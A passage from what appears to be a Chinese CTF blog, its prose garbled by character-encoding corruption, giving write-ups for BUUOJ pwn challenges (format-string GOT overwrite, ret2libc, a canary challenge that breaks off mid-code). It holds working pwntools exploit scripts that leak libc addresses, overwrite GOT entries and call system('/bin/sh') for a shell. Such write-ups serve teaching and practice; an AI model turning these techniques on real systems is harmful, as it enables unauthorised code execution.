<p>å¯ä»¥çœ‹åˆ°è¾“å…¥çš„å†…å®¹å‡ºç°åœ¨äº†æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²åç¬¬10ä¸ªå†…å­˜å•å…ƒ é‚£ä¹ˆè¿™æ—¶å€™å¦‚æœè¾“å…¥çš„æ˜¯<code>0x804C044~0x804C047</code> é‚£ä¹ˆä»<code>%10$x</code>å¼€å§‹çš„4ä¸ªå†…å­˜å•å…ƒå­˜æ”¾çš„å°±æ˜¯<code>random</code>æ¯å­—èŠ‚çš„åœ°å€ å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™æˆ<code>%10$n</code>å¼€å§‹çš„å››ä¸ªå†…å­˜å•å…ƒå°±èƒ½æ ¹æ®è¾“å…¥çš„é•¿åº¦(å››ä¸ªå†…å­˜è¿åœ¨ä¸€èµ·å½¢æˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦ å³0x10)æ¥ä¿®æ”¹randomçš„å€¼ æ‰€ä»¥ç¬¬äºŒæ¬¡å‘é€payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0x804C044</span>)+p32(<span class="number">0x804C045</span>)+p32(<span class="number">0x804C046</span>)+p32(<span class="number">0x804C047</span>)</span><br><span class="line">payload += <span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;passwd:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;269488144&#x27;</span>)    <span class="comment">#0x10101010</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>å³å¯get shell</p>
<h2 id="BUUOJ-axb-2019-fmt32-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#BUUOJ-axb-2019-fmt32-æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="BUUOJ-axb_2019_fmt32 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>BUUOJ-axb_2019_fmt32 | æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>è¿™é¢˜å­¦åˆ°äº†ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¿›è¡ŒAAW ç›´æ¥çœ‹ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">257</span>]; <span class="comment">// [esp+Fh] [ebp-239h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">300</span>]; <span class="comment">// [esp+110h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+23Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;Hello,I am a computer Repeater updated.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;So I&#x27;ll answer whatever you say!&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// alarm(3u);ä¸ºäº†æ–¹ä¾¿è°ƒè¯•patchæ‰äº†</span></span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">memset</span>(format, <span class="number">0</span>, <span class="keyword">sizeof</span>(format));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please tell me:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x100</span>u);</span><br><span class="line">    <span class="built_in">sprintf</span>(format, <span class="string">&quot;Repeater:%s\n&quot;</span>, s);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(format) &gt; <span class="number">0x10E</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;what you input is really long!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mainæ˜¯ç”¨<code>exit(0)</code>è€Œé<code>retn</code>é€€å‡ºçš„ åŸºæœ¬ä¸Šä¸ç”¨è€ƒè™‘ret2äº† ç„¶åæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ å†çœ‹çœ‹å„æ®µçš„æƒé™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F11%2F14%2F20241114-130637.png" alt="image-20241114130630164"></p>
<p>å‘ç°gotè¡¨æœ‰å†™çš„æƒé™ å¯ä»¥è¦†ç›–æ‰æŸä¸ªå‡½æ•°åŠ«æŒgotè¡¨ å†çœ‹çœ‹è°ƒç”¨<code>printf</code>å‰ä¸€åˆ»æ ˆçš„æƒ…å†µ:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F11%2F14%2F20241114-131139.png" alt="image-20241114131138978"></p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸‹çš„<code>%8$x</code>å°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å†…å®¹çš„ç¬¬äºŒä½ ä¹Ÿå°±æ˜¯<code>s[1]</code> å†è½¬åˆ°EBP:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F11%2F14%2F20241114-131413.png" alt="image-20241114131412971"></p>
<p>è¿™é‡Œçš„è¿”å›åœ°å€åœ¨libcä¸­<code>__libc_start_main+0xf7</code>çš„ä½ç½® å¯ä»¥ç”¨æ¥æ³„éœ²libc</p>
<p>ä¸€å¼€å§‹çš„æƒ³æ³•æ˜¯è¦†ç›–æ‰<code>strlen</code>çš„gotè¡¨åœ°å€ä¸º<code>system</code>çš„ç„¶åå½“æ‰§è¡Œ<code>strlen(format)</code>æ—¶æ‰§è¡Œçš„å°±æ˜¯<code>system(format)</code> åªè¦è¾“å…¥<code>;/bin/sh\x00</code>å¯¹å‰é¢çš„<code>Repeater:</code>è¿›è¡Œæˆªæ–­å°±èƒ½æ‰§è¡Œ<code>/bin/sh</code>æ¥get shell</p>
<p>ä½†æ˜¯å‘ç°åªä½¿ç”¨<code>%n</code>ä¼šå› ä¸ºè¦è¾“å…¥çš„å†…å®¹è¿‡é•¿æ— æ³•ä¸€æ¬¡è¦†ç›–æ‰4å­—èŠ‚çš„<code>strlen_got</code> è€Œä¸”ä¸èƒ½ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åˆ†4æ¬¡æ¥è¦†ç›– å› ä¸ºæ¯æ¬¡ä¿®æ”¹åç¨‹åºéƒ½ä¼šè°ƒç”¨<code>strlen</code>è€Œå¦‚æœè¦ä¸€æ¬¡åˆ†å››å­—èŠ‚æ¥è¦†ç›–ç›¸å½“äº<code>xxx%m$nxxx%m$nxxx%m$nxxx%m$n</code> éœ€è¦æ»¡è¶³è¿™4ä¸ªå­—èŠ‚åœ¨å†…å­˜ä¸­æ’æ”¾æ˜¯é€’å¢çš„</p>
<p>äºæ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°äº†è¿™ç¯‡è¯¦ç»†æè¿°äº†<a href="https://juejin.cn/post/6844903863242211335">å¦‚ä½•é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡ŒAAWçš„æ–‡ç« </a> ç®€å•æ¥è¯´ä»¥å‰ä»¥ä¸ºåªèƒ½é€šè¿‡è¾“å…¥å¤šä¸ªå­—ç¬¦æ¥è¿›è¡Œå¯¹æŸä¸ªåœ°å€å†…å®¹çš„å†™ ç°åœ¨å‘ç°å…¶å®å¯ä»¥ç›´æ¥ä½¿ç”¨<code>%[Num]c</code>æ¥è¡¨ç¤ºé‡å¤Numæ¬¡è¾“å‡ºæŸä¸ªå­—ç¬¦ è€Œä¸”è¦†ç›–çš„å­—èŠ‚æ•°ä¹Ÿæ˜¯å¯ä»¥è‡ªå·±å†³å®šçš„ å¯¹äº32ä½ç¨‹åºåˆ†åˆ«å¯ä»¥ç”¨</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">%n        <span class="comment">// å°†æŒ‡é’ˆè½¬åŒ–ä¸º(_DWORD *)</span></span><br><span class="line">%hn        <span class="comment">// å°†æŒ‡é’ˆè½¬åŒ–ä¸º(_WORD  *)</span></span><br><span class="line">%hhn    <span class="comment">// å°†æŒ‡é’ˆè½¬åŒ–ä¸º(_BYTE  *)</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å³ä½¿è¦æ‹†åˆ†åœ°ä¸ºæŸä¸ªå†…å­˜ä¸­çš„å­—èŠ‚è¿›è¡Œè¦†ç›–ä¹Ÿä¸ä¼šå› ä¸ºæŒ‡é’ˆç±»å‹å½±å“åˆ°å‘¨å›´çš„æ•°æ® è¿™æ ·å°±èƒ½åˆ©ç”¨ä¸Šé¢çš„æ€è·¯æ¥è¦†ç›–<code>strlen</code>çš„åœ°å€äº†:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./axb_2019_fmt32&quot;</span>)</span><br><span class="line">so  = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p   = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, xxxxx)</span><br><span class="line"></span><br><span class="line">start_main_f7 = so.symbols[<span class="string">&quot;__libc_start_main&quot;</span>] + <span class="number">0xf7</span></span><br><span class="line">strlen_got = elf.got[<span class="string">&quot;strlen&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(start_main_f7))</span><br><span class="line">p.sendline(<span class="string">b&#x27;0x%151$x&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">8</span>).decode(), <span class="number">16</span>) - start_main_f7</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + so.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># print(f&quot;system:\t&#123;system.to_bytes(4, &#x27;little&#x27;)&#125;&quot;)</span></span><br><span class="line">n1 = system &amp; <span class="number">0xffff</span></span><br><span class="line">n2 = (system &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;system:\t<span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>\nn1:\t\t<span class="subst">&#123;<span class="built_in">hex</span>(n1)&#125;</span>&quot;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;A&#x27;</span> + p32(strlen_got) + p32(strlen_got + <span class="number">2</span>)</span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;n1 - <span class="number">9</span> - <span class="built_in">len</span>(payload)&#125;</span>c&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">b&quot;%8$hn&quot;</span></span><br><span class="line">payload += <span class="string">f&quot;%<span class="subst">&#123;n2 - n1&#125;</span>c&quot;</span>.encode()</span><br><span class="line">payload += <span class="string">b&quot;%9$hn&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ciscn-2019-c-1-ret2libc"><a href="#BUUOJ-ciscn-2019-c-1-ret2libc" class="headerlink" title="BUUOJ-ciscn_2019_c_1 | ret2libc"></a>BUUOJ-ciscn_2019_c_1 | ret2libc</h2><p>ç¨‹åºæœ‰ä¸¤ä¸ªèƒ½è¾“å…¥çš„åœ°æ–¹ <code>encrypt()</code>ä¸­æœ‰æ˜æ˜¾çš„æ ˆæº¢å‡º:</p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-150927.png" alt="image-20240613150920256" style="zoom: 67%;" />

<p>vmmapæŸ¥çœ‹ä¸€ä¸‹å„ä¸ªæ®µçš„æƒé™:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-151130.png" alt="image-20240613151130505"></p>
<p>æ²¡æœ‰å¯å†™å¯æ‰§è¡Œçš„æ®µ æ‰€ä»¥æ€è·¯è½¬å‘<code>ret2libc</code> é¢˜ç›®æ²¡æœ‰ç»™å¯¹åº”ç‰ˆæœ¬çš„.soåº“ æ‰€ä»¥æµ‹è¯•çš„æ—¶å€™éœ€è¦è¿ä¸Šé¶æœºè·å–ç¯å¢ƒ</p>
<p>ret2libcæ„é€ ROPçš„æ€è·¯æ˜¯ç”¨ç¨‹åºæœ¬èº«åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ç©ºé—´ä¸­çš„libcå‡½æ•°æ¥æ³„éœ²libcåœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ç»å¯¹åŸºå€ å†é€šè¿‡åŸºå€è·å–åˆ°åŠ è½½åˆ°è™šæ‹Ÿå†…å­˜ä¸­çš„<code>system()</code>å’Œ<code>b&#39;\bin\sh&#39;</code>æ¥è·å–shellæˆ–è€…è°ƒç”¨ä»»æ„libcä¸­çš„å‡½æ•°</p>
<h3 id="GOTè¡¨å’ŒPLTè¡¨"><a href="#GOTè¡¨å’ŒPLTè¡¨" class="headerlink" title="GOTè¡¨å’ŒPLTè¡¨"></a>GOTè¡¨å’ŒPLTè¡¨</h3><p>GOTè¡¨è®°å½•äº†ç¨‹åºæ‰€ä½¿ç”¨çš„å¤–éƒ¨å‡½æ•°(libcä¸­çš„å‡½æ•°)åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„ç»å¯¹åœ°å€ åªæœ‰åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰èƒ½è·å–æ¯ä¸ªå‡½æ•°å…·ä½“çš„åœ°å€</p>
<p>PLTè¡¨æ˜¯ç”±å¤šæ®µç”¨äºè°ƒç”¨å¤–éƒ¨å‡½æ•°çš„ä»£ç å—ç»„æˆçš„ å½“ç¨‹åºè°ƒç”¨å…¶ä¸­ä¸€æ®µæ—¶è¿™æ®µä»£ç ä¼šä»GOTä¸­è·å–è¦è°ƒç”¨çš„å¤–éƒ¨å‡½æ•°çš„åœ°å€å¹¶æ‰§è¡Œ</p>
<p>è¿™ä¸ªç¨‹åºä¸­å¯ä»¥å…ˆç”¨<code>puts</code>æ¥æ³„éœ²è‡ªå·±çš„åœ°å€ä»è€Œè·å–libcçš„åŸºå€ å¯¹64ä½ç¨‹åºè¦å°†putsçš„åœ°å€ä½œä¸ºå‚æ•°è°ƒç”¨putséœ€è¦å°†GOTè¡¨ä¸­çš„putsåœ°å€å­˜æ”¾åœ¨rdiä¸­(<a href="https://wiki.osdev.org/System_V_ABI">Linuxè°ƒç”¨çº¦å®š</a>)  è¦å°†æ ˆä¸Šçš„å†…å®¹èµ‹å€¼ç»™å¯„å­˜å™¨å°±è¦å¯»æ‰¾<code>pop rdi;ret</code>çš„gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/06/13/20240613-153801.png" alt="image-20240613153801587"></p>
<p>åŒæ—¶Ubuntuç³»ç»Ÿè¦æ±‚ç¨‹åºçš„æ ˆå¹³è¡¡ retæŒ‡ä»¤çš„åœ°å€ä¹Ÿä¼šåœ¨payloadä¸­ç”¨åˆ°</p>
<p>ç¬¬ä¸€æ®µè·å–libcåŸºå€çš„payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25928</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pading = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x58</span> - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = pading + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">puts_libc = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># print(hex(puts_libc))</span></span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒæ®µç”¨äºè·å–shellçš„payload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_libc)</span><br><span class="line">libc_base = puts_libc - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2 = pading + p64(ret_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>ç”±äºUbuntuâ‰¥18ç‰ˆæœ¬systemå‡½æ•°ä¸­ç”¨åˆ°<code>movaps</code>æŒ‡ä»¤è¦æ±‚æ ˆ0x10å¯¹é½ æ‰€ä»¥éœ€è¦ä¿è¯systemå‡½æ•°å…¥å£åœ°å€å­˜æ”¾åœ¨åŸè¿”å›åœ°å€åœ¨æ ˆä¸­çš„ä½ç½®çš„+0x10N bytesä½ç½® ç”¨<code>ret</code>æŒ‡ä»¤çš„åœ°å€æ¥å¡«å……ä¸­é—´éœ€è¦å¡«å……çš„ä½ç½®å³å¯</p>
<h2 id="BUUOJ-OGeek2019-babyrop-ret2libc"><a href="#BUUOJ-OGeek2019-babyrop-ret2libc" class="headerlink" title="BUUOJ-[OGeek2019]babyrop | ret2libc"></a>BUUOJ-[OGeek2019]babyrop | ret2libc</h2><p>checksecä¸€ä¸‹å¼€äº†Full RELROå’ŒNX é‚£åŸºæœ¬ä¸Šåªèƒ½è€ƒè™‘ret2libcäº†</p>
<p>ä¼ªä»£ç (åŸç¨‹åºå»æ‰äº†ç¬¦å·è¡¨):</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl __noreturn <span class="title function_">handler</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Time&#x27;s up&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = input(buf);</span><br><span class="line">  vuln(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">input</span><span class="params">(<span class="type">int</span> randbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">ssize_t</span> v5; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%ld&quot;</span>, randbytes);</span><br><span class="line">  v5 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v5 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> __int8)buf[<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">231</span>]; <span class="comment">// [esp+11h] [ebp-E7h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªæœ‰å½“ç¬¬ä¸€æ¬¡è¾“å…¥ä¸ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒæ—¶æ‰æœ‰æœºä¼šè¿›å…¥æ¼æ´å‡½æ•° ä½†æ˜¯æ—¢ç„¶æ˜¯ç”¨<code>strncmp</code>è¿›è¡Œæ¯”è¾ƒ é‚£ä¹ˆå¯ä»¥è®©æ¯”è¾ƒçš„å­—èŠ‚æ•°ä¸º0æ¥ç»•è¿‡è¿™å±‚æ£€æµ‹å¹¶ä¿è¯è¿›å…¥æ¼æ´å‡½æ•°æ—¶è·å¾—æœ€å¤§çš„æº¢å‡ºé‡:</p>
<p><code>payload1 = b&#39;\x00\x00\x00\x00\x00\x00\x00\xff&#39;</code></p>
<p>ç„¶åæ„é€ æ³„éœ²libcåŸºå€çš„ROP è¿™é‡Œçš„æ€è·¯æ˜¯åˆ©ç”¨åœ¨<code>handler()</code>ä¸­ä½¿ç”¨äº†<code>puts</code>è¿™ä¸€ç‚¹æ¥æ³„éœ²libc å¾—åˆ°libcåŸºå€åå†å›åˆ°æ¼æ´å‡½æ•°è¿›è¡Œæœ€åä¸€æ¬¡è¾“å…¥æ¥è°ƒç”¨<code>system(&#39;/bin/sh&#39;)</code> éœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºæ˜¯32ä½çš„ å‚æ•°å­˜æ”¾åœ¨æ ˆä¸­:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_ret = p32(<span class="number">0x8048889</span>)</span><br><span class="line">vuln_func = p32(<span class="number">0x80487D0</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xE7</span> + <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload2 = padding + p32(puts_plt) + vuln_func + p32(puts_got) + p32(<span class="number">0xff</span>)</span><br></pre></td></tr></table></figure>

<p>æœ€åä¸€æ¬¡å‘é€æ•°æ®çš„æ—¶å€™å› ä¸ºç¡¬è¦ç”¨LibcSearcheræ¥çŒœlibcç‰ˆæœ¬å¡äº†ä¸€ä¼š å®é™…ä¸Šé¢˜ç›®ç»™äº†libcç‰ˆæœ¬åå¯ä»¥ç›´æ¥ç”¨IDAåœ¨å…¶ä¸­æ‰¾åˆ°putså‡½æ•°çš„ç›¸å¯¹åç§»ä»¥è®¡ç®—libc è·å¾—<code>system</code>å’Œ<code>b&#39;//bin//sh&#39;</code>çš„åœ°å€ä¹Ÿæ˜¯åŒç†ç›´æ¥åœ¨libcé‡Œé¢æ‰¾ æ®æ­¤æ„é€ ç¬¬ä¸‰ä¸ªpayload:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">base = puts_addr - <span class="number">0x5F140</span></span><br><span class="line">system = base + <span class="number">0x3A940</span></span><br><span class="line">binsh = base + <span class="number">0x15902B</span></span><br><span class="line"></span><br><span class="line">payload3 = padding + p32(system) + main_ret + p32(binsh)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-ciscn-2019-ne-5-ç®€å•canary"><a href="#BUUOJ-ciscn-2019-ne-5-ç®€å•canary" class="headerlink" title="BUUOJ-ciscn_2019_ne_5 | ç®€å•canary"></a>BUUOJ-ciscn_2019_ne_5 | ç®€å•canary</h2><p>åªå¼€äº†NXé˜²æŠ¤ åŸºæœ¬ä¸ç”¨è€ƒè™‘ret2shellcodeäº† ä¸»å‡½æ•°æ²¡æœ‰æ‰¾åˆ°å¯ä»¥æ“ä½œçš„éƒ¨åˆ† ç›´æ¥çœ‹æ¼æ´å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, src);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span 